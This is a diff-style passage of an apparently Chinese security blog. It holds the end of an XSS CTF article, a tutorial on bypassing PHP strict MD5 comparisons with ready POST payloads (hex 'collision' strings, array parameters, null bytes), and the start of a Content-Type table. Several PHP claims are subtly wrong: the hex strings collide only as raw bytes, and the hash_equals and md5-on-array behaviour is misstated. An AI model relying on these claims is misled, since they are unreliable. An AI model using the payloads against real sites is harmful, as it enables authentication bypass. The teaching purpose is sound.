-</li>
-<li><p>执行后，fetch() 请求会获取到包含 flag 的页面内容，并通过 Image 对象将数据发送到攻击者服务器。</p>
-</li>
-</ul>
-<hr>
-<h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><ul>
-<li><strong>输入过滤与输出编码：</strong><br>对所有用户输入进行严格过滤，并在输出时进行适当编码，防止 HTML&#x2F;JS 注入。</li>
-<li><strong>Content Security Policy (CSP)：</strong><br>实施 CSP 可有效限制内嵌脚本的执行，降低 XSS 攻击风险。</li>
-<li><strong>CSRF Token：</strong><br>对敏感操作采用 CSRF token 机制，确保请求来自可信任的页面。</li>
-<li><strong>HttpOnly Cookies：</strong><br>虽然 HttpOnly 可防止 JavaScript 直接访问 Cookie，但不能防止通过 XSS 进行间接的攻击（如 fetch() 读取页面内容）。</li>
-</ul>
-<hr>
-<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>XSS 攻击在 CTF 中非常常见，其形式多样，从简单的弹出框到复杂的 CSRF-to-XSS 链式攻击。通过学习和实践这些技巧，不仅可以提高你在 CTF 中的实战能力，也能加深对 Web 安全原理的理解。希望这篇博客能帮助你了解 XSS 攻击的各种方法及防御措施，并在 CTF 比赛中取得好成绩！</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/XSS/" data-id="cmaxygi0k000aoc7kf0p37uic" data-title="XSS跨站脚本攻击" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/PHP比较漏洞/强比较" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/">PHP强比较漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h1><h2 id="1-MD5-碰撞（Collision-Attack）"><a href="#1-MD5-碰撞（Collision-Attack）" class="headerlink" title="1. MD5 碰撞（Collision Attack）"></a><strong>1. MD5 碰撞（Collision Attack）</strong></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。<br><strong>适用于</strong> <code>md5($a) === md5($b)</code>​ 且 <code>$a !== $b</code>​ 的情况。</p>
-<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;240610708&quot;</span>;  <span class="comment">// md5: 0e462097431906509019562988736854</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;QNKCDZO&quot;</span>;    <span class="comment">// md5: 0e830400451993494058024219903391</span></span><br></pre></td></tr></table></figure>
-
-<p>虽然这两个字符串的 MD5 都以 <code>0e</code>​ 开头，但严格比较（<code>===</code>​）仍然会检查整个字符串，因此 <strong>需要找到真正的 MD5 碰撞</strong>。</p>
-<h3 id="已知-MD5-碰撞对"><a href="#已知-MD5-碰撞对" class="headerlink" title="已知 MD5 碰撞对"></a><strong>已知 MD5 碰撞对</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$collision1</span> = <span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$collision2</span> = <span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>这两个字符串的 MD5 完全相同：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$collision1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$collision2</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击方式</strong>：</p>
-<ul>
-<li><p>构造 <code>POST</code>​ 请求，提交这两个字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&amp;dsy=4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</span><br></pre></td></tr></table></figure></li>
-<li><p>这样 <code>md5($wqh) === md5($dsy)</code>​ 成立，且 <code>$wqh !== $dsy</code>​。</p>
-</li>
-</ul>
-<hr>
-<h2 id="2-数组绕过（Array-Bypass）"><a href="#2-数组绕过（Array-Bypass）" class="headerlink" title="2. 数组绕过（Array Bypass）"></a><strong>2. 数组绕过（Array Bypass）</strong></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>PHP 的 <code>md5()</code>​ 函数在接收数组时会返回 <code>false</code>​，因此如果 <code>$wqh</code>​ 和 <code>$dsy</code>​ 都是数组，则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$wqh</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$dsy</span>); <span class="comment">// false === false → true</span></span><br></pre></td></tr></table></figure>
-
-<p>但代码中通常会有 <code>$wqh !== $dsy</code>​ 检查，因此需要构造两个不同的数组。</p>
-<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wqh</span> = [<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>];</span><br><span class="line"><span class="variable">$dsy</span> = [<span class="string">&quot;b&quot;</span> =&gt; <span class="number">2</span>];</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都返回 <code>false</code>​。</li>
-<li>​<code>$wqh !== $dsy</code>​ 成立（因为数组不同）。</li>
-</ul>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh[]=1&amp;dsy[]=2</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>​<code>$_POST[&#39;wqh&#39;]</code>​ 和 <code>$_POST[&#39;dsy&#39;]</code>​ 是不同的数组。</li>
-<li>​<code>md5($_POST[&#39;wqh&#39;]) === md5($_POST[&#39;dsy&#39;])</code>​ 成立（都是 <code>false</code>​）。</li>
-<li>​<code>$_POST[&#39;wqh&#39;] !== $_POST[&#39;dsy&#39;]</code>​ 成立。</li>
-</ul>
-<hr>
-<h2 id="3-特殊字符串绕过（Magic-Hashes）"><a href="#3-特殊字符串绕过（Magic-Hashes）" class="headerlink" title="3. 特殊字符串绕过（Magic Hashes）"></a><strong>3. 特殊字符串绕过（Magic Hashes）</strong></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>某些字符串的 MD5 哈希值以 <code>0e</code>​ 开头（科学计数法），在 **松散比较（**​ <strong>​<code>==</code>​</strong> ​ <strong>）</strong>  时会被视为 <code>0</code>​，但在 **严格比较（**​ <strong>​<code>===</code>​</strong> ​ <strong>）</strong>  时仍然需要完全匹配。</p>
-<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s878926199a&quot;</span>; <span class="comment">// md5: 0e545993274517709034328855841020</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;s155964671a&quot;</span>; <span class="comment">// md5: 0e342768416822451524974117254469</span></span><br></pre></td></tr></table></figure>
-
-<p>虽然它们的 MD5 都以 <code>0e</code>​ 开头，但严格比较时不会匹配。</p>
-<h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a><strong>适用情况</strong></h3><p>如果代码错误地使用了 <code>==</code>​ 而不是 <code>===</code>​，可以使用这些字符串绕过：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
-
-<p>但在严格比较（<code>===</code>​）下无效。</p>
-<hr>
-<h2 id="4-NULL-字节注入（Null-Byte-Injection）"><a href="#4-NULL-字节注入（Null-Byte-Injection）" class="headerlink" title="4. NULL 字节注入（Null Byte Injection）"></a><strong>4. NULL 字节注入（Null Byte Injection）</strong></h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码在计算 MD5 之前对输入进行了字符串处理（如 <code>trim()</code>​、<code>substr()</code>​），可能会因 NULL 字节（<code>%00</code>​）导致哈希值相同。</p>
-<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc\00&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>如果代码在计算 MD5 之前去掉了 NULL 字节，则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$a</span>)) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh=abc%00&amp;dsy=abc</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器端代码对输入进行了 <code>trim()</code>​ 或类似处理，可能绕过。</p>
-<hr>
-<h2 id="5-利用-​hash-equals​​-的缺陷"><a href="#5-利用-​hash-equals​​-的缺陷" class="headerlink" title="5. 利用 ​hash_equals​​ 的缺陷"></a><strong>5. 利用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>的缺陷</strong></h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码使用 <code>hash_equals(md5($a), md5($b))</code>​，仍然可能被数组绕过：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">md5</span>([]), <span class="title function_ invoke__">md5</span>([])); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a><strong>攻击方式</strong></h3><p>提交数组：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /target.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wqh[]=1&amp;dsy[]=2</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>​<code>md5($wqh)</code>​ 和 <code>md5($dsy)</code>​ 都是 <code>false</code>​。</li>
-<li>​<code>hash_equals(false, false)</code>​ 返回 <code>true</code>​。</li>
-</ul>
-<hr>
-<h2 id="6-利用-​-​-​-的严格比较特性"><a href="#6-利用-​-​-​-的严格比较特性" class="headerlink" title="6. 利用  ​===​ ​ 的严格比较特性"></a><strong>6. 利用</strong>  <strong>​<code>===</code>​</strong> ​ <strong>的严格比较特性</strong></h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>如果代码逻辑有误，比如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
-
-<p>但 <code>md5($a)</code>​ 和 <code>md5($b)</code>​ 必须完全相同，因此 <strong>必须找到真正的 MD5 碰撞</strong>（如方法 1）。</p>
-<hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>适用条件</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>MD5 碰撞</strong></td>
-<td>严格比较（<code>===</code>​）</td>
-<td>​<code>4dc968ff...</code>​vs<code>4dc968ff...</code>​</td>
-</tr>
-<tr>
-<td><strong>数组绕过</strong></td>
-<td>​<code>md5([]) === false</code>​</td>
-<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
-</tr>
-<tr>
-<td><strong>Magic Hashes</strong></td>
-<td>仅适用于<code>==</code>​</td>
-<td>​<code>s878926199a</code>​vs<code>s155964671a</code>​</td>
-</tr>
-<tr>
-<td><strong>NULL 字节注入</strong></td>
-<td>输入被<code>trim()</code>​处理</td>
-<td>​<code>abc%00</code>​vs<code>abc</code>​</td>
-</tr>
-<tr>
-<td>**<code>hash_equals</code>​绕过**</td>
-<td>使用<code>hash_equals</code>​</td>
-<td>​<code>wqh[]=1&amp;dsy[]=2</code>​</td>
-</tr>
-</tbody></table>
-<h3 id="最佳防御方式"><a href="#最佳防御方式" class="headerlink" title="最佳防御方式"></a><strong>最佳防御方式</strong></h3><ol>
-<li><strong>避免使用 MD5</strong>，改用 <code>SHA-256</code>​ 或 <code>bcrypt</code>​。</li>
-<li><strong>检查输入类型</strong>（<code>is_string()</code>​）。</li>
-<li><strong>禁止数组输入</strong>（<code>is_array()</code>​ 检查）。</li>
-<li><strong>使用</strong> <strong>​<code>hash_equals</code>​</strong>​ <strong>但确保输入是字符串</strong>。</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" data-id="cmaxygi0q000yoc7k09lbeepy" data-title="PHP强比较漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/HTTP教程/HTTP content-type" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web/">Web</a>►<a class="article-category-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/">HTTP Content-Type详解</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="HTTP-content-type"><a href="#HTTP-content-type" class="headerlink" title="HTTP content-type"></a>HTTP content-type</h1><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p>
-<p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p>
-<p>语法格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Type: multipart/form-data; boundary=something</span><br></pre></td></tr></table></figure>
-
-<p>实例：</p>
-<p><img src="/.com//image-20250520030815-5f15wxu.png" alt="image"></p>
-<p>常见的媒体格式类型如下：</p>
-<ul>
-<li>text&#x2F;html ： HTML格式</li>
-<li>text&#x2F;plain ：纯文本格式</li>
-<li>text&#x2F;xml ： XML格式</li>
-<li>image&#x2F;gif ：gif图片格式</li>
-<li>image&#x2F;jpeg ：jpg图片格式</li>
-<li>image&#x2F;png：png图片格式</li>
-</ul>
-<p>以application开头的媒体格式类型：</p>
-<ul>
-<li>application&#x2F;xhtml+xml ：XHTML格式</li>
-<li>application&#x2F;xml： XML数据格式</li>
-<li>application&#x2F;atom+xml ：Atom XML聚合格式</li>
-<li>application&#x2F;json： JSON数据格式</li>
-<li>application&#x2F;pdf：pdf格式</li>
-<li>application&#x2F;msword ： Word文档格式</li>
-<li>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）</li>
-<li>application&#x2F;x-www-form-urlencoded ： &lt;form encType=””&gt;中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）</li>
-</ul>
-<p>另外一种常见的媒体格式是上传文件之时使用的：</p>
-<ul>
-<li>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li>
-</ul>
-<hr>
-<h2 id="HTTP-content-type-对照表"><a href="#HTTP-content-type-对照表" class="headerlink" title="HTTP content-type 对照表"></a>HTTP content-type 对照表</h2><table>
-<thead>
-<tr>
-<th>文件扩展名</th>
-<th>Content-Type(Mime-Type)</th>
-<th>文件扩展名</th>
-<th>Content-Type(Mime-Type)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>.*（ 二进制流，不知道下载文件类型）</td>
-<td>application&#x2F;octet-stream</td>
-<td>.tif</td>
-<td>image&#x2F;tiff</td>
-</tr>
-<tr>
-<td>.001</td>
-<td>application&#x2F;x-001</td>
-<td>.301</td>
-<td>application&#x2F;x-301</td>
-</tr>
-<tr>
-<td>.323</td>
-<td>text&#x2F;h323</td>
-<td>.906</td>
-<td>application&#x2F;x-906</td>
-</tr>
-<tr>
-<td>.907</td>
-<td>drawing&#x2F;907</td>
-<td>.a11</td>
-<td>application&#x2F;x-a11</td>
-</tr>
-<tr>
-<td>.acp</td>
-<td>audio&#x2F;x-mei-aac</td>
-<td>.ai</td>
-<td>application&#x2F;postscript</td>
-</tr>
-<tr>
-<td>.aif</td>
-<td>audio&#x2F;aiff</td>
-<td>.aifc</td>
-<td>audio&#x2F;aiff</td>
-</tr>
-<tr>
-<td>.aiff</td>
-<td>audio&#x2F;aiff</td>
-<td>.anv</td>
-<td>application&#x2F;x-anv</td>
-</tr>
-<tr>
-<td>.asa</td>
-<td>text&#x2F;asa</td>
-<td>.asf</td>
-<td>video&#x2F;x-ms-asf</td>
-</tr>
-<tr>
-<td>.asp</td>
-<td>text&#x2F;asp</td>
-<td>.asx</td>
-<td>video&#x2F;x-ms-asf</td>
-</tr>
-<tr>
-<td>.au</td>
-<td>audio&#x2F;basic</td>
-<td>.avi</td>
-<td>video&#x2F;avi</td>
-</tr>
-<tr>
-<td>.awf</td>
-<td>application&#x2F;vnd.adobe.workflow</td>
-<td>.biz</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.bmp</td>
-<td>application&#x2F;x-bmp</td>
-<td>.bot</td>
-<td>application&#x2F;x-bot</td>
-</tr>
-<tr>
-<td>.c4t</td>
-<td>application&#x2F;x-c4t</td>
-<td>.c90</td>
-<td>application&#x2F;x-c90</td>
-</tr>
-<tr>
-<td>.cal</td>
-<td>application&#x2F;x-cals</td>
-<td>.cat</td>
-<td>application&#x2F;vnd.ms-pki.seccat</td>
-</tr>
-<tr>
-<td>.cdf</td>
-<td>application&#x2F;x-netcdf</td>
-<td>.cdr</td>
-<td>application&#x2F;x-cdr</td>
-</tr>
-<tr>
-<td>.cel</td>
-<td>application&#x2F;x-cel</td>
-<td>.cer</td>
-<td>application&#x2F;x-x509-ca-cert</td>
-</tr>
-<tr>
-<td>.cg4</td>
-<td>application&#x2F;x-g4</td>
-<td>.cgm</td>
-<td>application&#x2F;x-cgm</td>
-</tr>
-<tr>
-<td>.cit</td>
-<td>application&#x2F;x-cit</td>
-<td>.class</td>
-<td>java&#x2F;*</td>
-</tr>
-<tr>
-<td>.cml</td>
-<td>text&#x2F;xml</td>
-<td>.cmp</td>
-<td>application&#x2F;x-cmp</td>
-</tr>
-<tr>
-<td>.cmx</td>
-<td>application&#x2F;x-cmx</td>
-<td>.cot</td>
-<td>application&#x2F;x-cot</td>
-</tr>
-<tr>
-<td>.crl</td>
-<td>application&#x2F;pkix-crl</td>
-<td>.crt</td>
-<td>application&#x2F;x-x509-ca-cert</td>
-</tr>
-<tr>
-<td>.csi</td>
-<td>application&#x2F;x-csi</td>
-<td>.css</td>
-<td>text&#x2F;css</td>
-</tr>
-<tr>
-<td>.cut</td>
-<td>application&#x2F;x-cut</td>
-<td>.dbf</td>
-<td>application&#x2F;x-dbf</td>
-</tr>
-<tr>
-<td>.dbm</td>
-<td>application&#x2F;x-dbm</td>
-<td>.dbx</td>
-<td>application&#x2F;x-dbx</td>
-</tr>
-<tr>
-<td>.dcd</td>
-<td>text&#x2F;xml</td>
-<td>.dcx</td>
-<td>application&#x2F;x-dcx</td>
-</tr>
-<tr>
-<td>.der</td>
-<td>application&#x2F;x-x509-ca-cert</td>
-<td>.dgn</td>
-<td>application&#x2F;x-dgn</td>
-</tr>
-<tr>
-<td>.dib</td>
-<td>application&#x2F;x-dib</td>
-<td>.dll</td>
-<td>application&#x2F;x-msdownload</td>
-</tr>
-<tr>
-<td>.doc</td>
-<td>application&#x2F;msword</td>
-<td>.dot</td>
-<td>application&#x2F;msword</td>
-</tr>
-<tr>
-<td>.drw</td>
-<td>application&#x2F;x-drw</td>
-<td>.dtd</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.dwf</td>
-<td>Model&#x2F;vnd.dwf</td>
-<td>.dwf</td>
-<td>application&#x2F;x-dwf</td>
-</tr>
-<tr>
-<td>.dwg</td>
-<td>application&#x2F;x-dwg</td>
-<td>.dxb</td>
-<td>application&#x2F;x-dxb</td>
-</tr>
-<tr>
-<td>.dxf</td>
-<td>application&#x2F;x-dxf</td>
-<td>.edn</td>
-<td>application&#x2F;vnd.adobe.edn</td>
-</tr>
-<tr>
-<td>.emf</td>
-<td>application&#x2F;x-emf</td>
-<td>.eml</td>
-<td>message&#x2F;rfc822</td>
-</tr>
-<tr>
-<td>.ent</td>
-<td>text&#x2F;xml</td>
-<td>.epi</td>
-<td>application&#x2F;x-epi</td>
-</tr>
-<tr>
-<td>.eps</td>
-<td>application&#x2F;x-ps</td>
-<td>.eps</td>
-<td>application&#x2F;postscript</td>
-</tr>
-<tr>
-<td>.etd</td>
-<td>application&#x2F;x-ebx</td>
-<td>.exe</td>
-<td>application&#x2F;x-msdownload</td>
-</tr>
-<tr>
-<td>.fax</td>
-<td>image&#x2F;fax</td>
-<td>.fdf</td>
-<td>application&#x2F;vnd.fdf</td>
-</tr>
-<tr>
-<td>.fif</td>
-<td>application&#x2F;fractals</td>
-<td>.fo</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.frm</td>
-<td>application&#x2F;x-frm</td>
-<td>.g4</td>
-<td>application&#x2F;x-g4</td>
-</tr>
-<tr>
-<td>.gbr</td>
-<td>application&#x2F;x-gbr</td>
-<td>.</td>
-<td>application&#x2F;x-</td>
-</tr>
-<tr>
-<td>.gif</td>
-<td>image&#x2F;gif</td>
-<td>.gl2</td>
-<td>application&#x2F;x-gl2</td>
-</tr>
-<tr>
-<td>.gp4</td>
-<td>application&#x2F;x-gp4</td>
-<td>.hgl</td>
-<td>application&#x2F;x-hgl</td>
-</tr>
-<tr>
-<td>.hmr</td>
-<td>application&#x2F;x-hmr</td>
-<td>.hpg</td>
-<td>application&#x2F;x-hpgl</td>
-</tr>
-<tr>
-<td>.hpl</td>
-<td>application&#x2F;x-hpl</td>
-<td>.hqx</td>
-<td>application&#x2F;mac-binhex40</td>
-</tr>
-<tr>
-<td>.hrf</td>
-<td>application&#x2F;x-hrf</td>
-<td>.hta</td>
-<td>application&#x2F;hta</td>
-</tr>
-<tr>
-<td>.htc</td>
-<td>text&#x2F;x-component</td>
-<td>.htm</td>
-<td>text&#x2F;html</td>
-</tr>
-<tr>
-<td>.html</td>
-<td>text&#x2F;html</td>
-<td>.htt</td>
-<td>text&#x2F;webviewhtml</td>
-</tr>
-<tr>
-<td>.htx</td>
-<td>text&#x2F;html</td>
-<td>.icb</td>
-<td>application&#x2F;x-icb</td>
-</tr>
-<tr>
-<td>.ico</td>
-<td>image&#x2F;x-icon</td>
-<td>.ico</td>
-<td>application&#x2F;x-ico</td>
-</tr>
-<tr>
-<td>.iff</td>
-<td>application&#x2F;x-iff</td>
-<td>.ig4</td>
-<td>application&#x2F;x-g4</td>
-</tr>
-<tr>
-<td>.igs</td>
-<td>application&#x2F;x-igs</td>
-<td>.iii</td>
-<td>application&#x2F;x-iphone</td>
-</tr>
-<tr>
-<td>.img</td>
-<td>application&#x2F;x-img</td>
-<td>.ins</td>
-<td>application&#x2F;x-internet-signup</td>
-</tr>
-<tr>
-<td>.isp</td>
-<td>application&#x2F;x-internet-signup</td>
-<td>.IVF</td>
-<td>video&#x2F;x-ivf</td>
-</tr>
-<tr>
-<td>.java</td>
-<td>java&#x2F;*</td>
-<td>.jfif</td>
-<td>image&#x2F;jpeg</td>
-</tr>
-<tr>
-<td>.jpe</td>
-<td>image&#x2F;jpeg</td>
-<td>.jpe</td>
-<td>application&#x2F;x-jpe</td>
-</tr>
-<tr>
-<td>.jpeg</td>
-<td>image&#x2F;jpeg</td>
-<td>.jpg</td>
-<td>image&#x2F;jpeg</td>
-</tr>
-<tr>
-<td>.jpg</td>
-<td>application&#x2F;x-jpg</td>
-<td>.js</td>
-<td>application&#x2F;x-javascript</td>
-</tr>
-<tr>
-<td>.jsp</td>
